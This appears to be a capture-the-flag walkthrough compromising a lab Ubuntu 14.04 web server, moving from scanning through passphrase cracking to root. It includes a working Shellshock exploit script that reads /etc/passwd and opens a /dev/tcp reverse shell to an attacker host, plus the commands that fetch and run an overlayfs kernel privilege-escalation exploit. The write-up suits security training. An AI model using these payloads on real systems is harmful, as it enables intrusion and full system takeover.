<img width="680" height="340" alt="turtle" src="https://github.com/user-attachments/assets/addabb14-fc6a-426e-ac50-521699c514a2" />



I started by running an Nmap scan to see what services were exposed on the target machine. This helps understand the attack surface before diving deeper.

First, I ran a standard scan with default scripts and version detection:

```bash
mrbunny $ sudo nmap -sS -p- 10.80.160.139 -oN port-scan.txt -T5
[sudo] password for greatkey: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-04 21:49 EST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.46% done
Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 56.47% done; ETC: 21:50 (0:00:32 remaining)
Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 60.39% done; ETC: 21:50 (0:00:28 remaining)
Nmap scan report for 10.80.160.139
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 55.52 second
```



The scan revealed only two open ports:

22/tcp – SSH

80/tcp – HTTP

Since SSH typically requires valid credentials, I decided to focus on the web service running on port 80, as web applications often provide an initial entry point.

<img width="1920" height="1080" alt="Screenshot at 2026-01-04 22-00-21" src="https://github.com/user-attachments/assets/47b56902-5133-4a87-808b-2ff06308f83a" />
```

i also try to find what web-stack is used here so i try whatweb and wig for more information:
```
mrbunny $ whatweb http://10.80.160.139/
http://10.80.160.139/ [200 OK] Apache[2.4.7], Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.80.160.139], JQuery, Meta-Author[name], Script, Title[0day]

```

```
mrbunny $ wig http://10.80.160.139/

wig - WebApp Information Gatherer


Scanning http://10.80.160.139/...
_________________ SITE INFO __________________
IP              Title                         
10.80.160.139   0day                        
                                              
__________________ VERSION ___________________
Name            Versions   Type               
Apache          2.4.7      Platform           
Ubuntu          14.04      OS                 
                                              
______________________________________________
Time: 30.5 sec  Urls: 810  Fingerprints: 39241
```

i try common hints endpoint robosts.txt


http://10.80.160.139/robots.txt
'''You really thought it'd be this easy?
'''
```
i try other path like login,and also admin but amdin return blank page 
### Directory Brute Forcing

After identifying a web service running on port 80, I performed directory brute forcing to discover hidden directories and files that were not directly accessible from the main page.

I used **Gobuster** with a common directory wordlist:

```bash
mrbunny $ gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt dir -u http://10.80.160.139/ -o directory-disctory.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.160.139/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin              (Status: 301) [Size: 315] [--> http://10.80.160.139/cgi-bin/]
/img                  (Status: 301) [Size: 311] [--> http://10.80.160.139/img/]
/uploads              (Status: 301) [Size: 315] [--> http://10.80.160.139/uploads/]
/admin                (Status: 301) [Size: 313] [--> http://10.80.160.139/admin/]
/css                  (Status: 301) [Size: 311] [--> http://10.80.160.139/css/]
/js                   (Status: 301) [Size: 310] [--> http://10.80.160.139/js/]
/backup               (Status: 301) [Size: 314] [--> http://10.80.160.139/backup/]
/secret               (Status: 301) [Size: 314] [--> http://10.80.160.139/secret/]
```
i found some intresting directory i try go watch what intresting i can here found
![forb at 2026-01-04 22-41-44-crop](https://github.com/user-attachments/assets/e750ab83-3399-492c-ac32-c05b624b6593)

![arc](https://github.com/user-attachments/assets/0963cf0c-0fb6-4a8f-aeeb-faeb3a21e3ca)

![Screenshot at 2026-01-04 22-49-01](https://github.com/user-attachments/assets/2e2e8d0a-ecb5-44dc-b919-497fa058bd80)
now again it's return blank page,so i now go for others

![Screenshot at 2026-01-04 23-01-54](https://github.com/user-attachments/assets/56e791eb-2aa7-4337-9817-644f2411b79b)


While continuing directory enumeration, I discovered a `/backup` directory. Inside this directory, I found an SSH private key encoded.



![Screenshot at 2026-01-04 22-55-55](https://github.com/user-attachments/assets/fb424ab8-cf07-4a82-81c3-c2a1b5f820e0)


The key was encrypted, meaning a passphrase was required to use it. At this stage, the main challenge was identifying the correct username associated with the key and cracking the passphrase.
so save it and crack it
i used ssh2john to conver in hash so john can understand it for cracking
and then i simple use john and i get id_rsa:letmein(passphrase key)
```bash
mrbunny $ nano id_rsa
mrbunny $ ls
cache  directory-disctory.txt  id_rsa  port-scan.txt
mrbunny $ file id_rsa
id_rsa: PEM RSA private key
mrbunny $ ssh2john id_rsa > id_rsa.hash
mrbunny $ ls
cache  directory-disctory.txt  id_rsa  id_rsa.hash  port-scan.txt
mrbunny $ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)     
1g 0:00:00:00 DONE (2026-01-04 23:15) 14.28g/s 7314p/s 7314c/s 7314C/s teiubesc..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
mrbunny $ john --show id_rsa.hash
id_rsa:letmein

1 password hash cracked, 0 left
mrbunny $

```
now we can try to login normaly
```bash
mrbunny $ ls -l id_rsa
-rw-r--r-- 1 greatkey greatkey 1766 Jan  4 23:14 id_rsa
mrbunny $ chmod 400 id_rsa
mrbunny $ ls -l id_rsa
-r-------- 1 greatkey greatkey 1766 Jan  4 23:14 id_rsa
mrbunny $ ssh -i id_rsa turtle@10.80.160.139 
The authenticity of host '10.80.160.139 (10.80.160.139)' can't be established.
ED25519 key fingerprint is SHA256:RagPojtI1X12KWTyYetHjXVozjQqsxNmneOUKEjxwU0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.80.160.139' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
sign_and_send_pubkey: no mutual signature supported
turtle@10.80.160.139's password: 
Permission denied, please try again.
turtle@10.80.160.139's password: 
Permission denied, please try again.
turtle@10.80.160.139's password: 
turtle@10.80.160.139: Permission denied (publickey,password).
```

now i move on web-server ,i use nikto to probe server if is vulnerable we can definatly exploit and get initial access

i use nikto for web server vulnerability scanning

```
mrbunny $ nikto -h 10.80.160.139
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.80.160.139
+ Target Hostname:    10.80.160.139
+ Target Port:        80
+ Start Time:         2026-01-05 00:44:51 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6271' found, with contents: true.
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278

+ /admin/: This might be interesting.
+ /backup/: This might be interesting.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /secret/: This might be interesting.
+ /cgi-bin/test.cgi: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
```
here nikto detect a vulnerable end point of /cgi-bin/test.cgi it's a vulnerable to shellshock.
i use my osint skill and found a shellshock exploit by using CVE-2014-6278,and then modified it's so it's work on out target
linke:https://www.exploit-db.com/exploits/39568
it's require python2 version i dont have so i convert this exploit into python3 so i use it

eploit:
```
#!/usr/bin/env python3

import requests
import time
import sys

if len(sys.argv) < 4:
    print("\n[*] Cisco UCS Manager 2.1(1b) Shellshock Exploit")
    print("[*] Usage: python3 shellshock.py <Victim IP> <Attacking Host> <Reverse Shell Port>")
    print("[*]")
    print("[*] Example: python3 shellshock.py 127.0.0.1 127.0.0.1 4444")
    print("[*] Listener: nc -lvnp <port>\n")
    sys.exit()

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

ucs = sys.argv[1]
attackhost = sys.argv[2]
revshellport = sys.argv[3]

# ⚠️ CHANGE THIS PATH if your CGI file is different
url = "http://" + ucs + "/cgi-bin/test.cgi"

headers_check = {
    "User-Agent": '() { test;}; echo "Content-type: text/plain"; echo; echo $(</etc/passwd)'
}

headers_shell = {
    "User-Agent": f'() {{ :; }}; /bin/bash -i >& /dev/tcp/{attackhost}/{revshellport} 0>&1'
}

def exploit():
    try:
        requests.get(url, headers=headers_shell, timeout=5)
    except Exception as e:
        if "timed out" in str(e):
            print("[+] Exploit sent, check your listener!")
        else:
            print("[-] Exploit failed")
            print("[-] Error:", e)

def main():
    try:
        r = requests.get(url, headers=headers_check, timeout=5)
        if "root:" in r.text:
            print("[+] Host appears vulnerable! Spawning reverse shell...")
            time.sleep(2)
            exploit()
        else:
            print("[-] Host does not appear vulnerable.")
    except Exception as e:
        print("[-] Error:", e)

if __name__ == "__main__":
    main()
```
how to run:
 ```bash
mrbunny $ python 39568.py 10.80.160.139 192.168.1.78  4646
[+] Host appears vulnerable! Spawning reverse shell...
[+] Exploit sent, check your listener!

```
run a netcat for listening
```
bash 
mrbunny $ nc -lvnp 4646
Listening on 0.0.0.0 4646
id
ls
Connection received on 10.80.160.139 41063
bash: cannot set terminal process group (867): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:/usr/lib/cgi-bin$ ls
test.cgi
www-data@ubuntu:/usr/lib/cgi-bin$ 

```
now we have a initial access good job
so this time is a privledge esclation
i used a kernal exploit vector for privilede esclation and 

```bash
www-data@ubuntu:/tmp$ hostnamectl
hostnamectl
   Static hostname: ubuntu
         Icon name: computer-vm
           Chassis: vm
           Boot ID: 9cac0573c2eb45fcb4885efea5871095
  Operating System: Ubuntu 14.04.1 LTS
            Kernel: Linux 3.13.0-32-generic
      Architecture: x86_64
www-data@ubuntu:/tmp$ 

```
search for known exploit in searchsploit database:
```bash
mrbunny $ searchsploit 3.13.0-32 ubuntu
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                        | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                                   | linux/local/37293.txt
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                                                      | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                                                             | linux/local/31346.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                                        | linux/dos/43234.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                               | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                      | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                           | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                       | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                   | linux/local/47169.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                                      | linux/local/41760.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------ 
```
it's listed some kernal exploit i choose 1st exploit and 
localtion in my parrot machin of payload is:/usr/share/exploitdb/exploits/linux/local/37292.c 
transfer it on target machine 

```bash
mrbunny $ pwd
/usr/share/exploitdb/exploits/linux/local/37292.c
mrbunny $ python -m http.server 5656
Serving HTTP on 0.0.0.0 port 5656 (http://0.0.0.0:5656/) ...

```
```bash
www-data@ubuntu:/tmp$ wget http://192.168.226.188:5656/37292.c
wget http://192.168.226.188:5656/37292.c
--2026-01-04 23:22:13--  http://192.168.226.188:5656/37292.c
Connecting to 192.168.226.188:5656... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: '37292.c'

     0K ....                                                  100% 2.74M=0.002s

2026-01-04 23:22:13 (2.74 MB/s) - '37292.c' saved [4968/4968]

www-data@ubuntu:/tmp$ ls
ls
37292.c
exploit
kernal_exploit
linpeas.sh
www-data@ubuntu:/tmp$ chmod u+x 37292.c
chmod u+x 37292.c
www-data@ubuntu:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
bin:/sbin:/binsr/local/sbin:/usr/local/bin:/usr/sbin:/usr/ 
www-data@ubuntu:/tmp$ 

www-data@ubuntu:/tmp$ gcc 37292.c -o exploit
gcc 37292.c -o exploit
www-data@ubuntu:/tmp$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# 

```


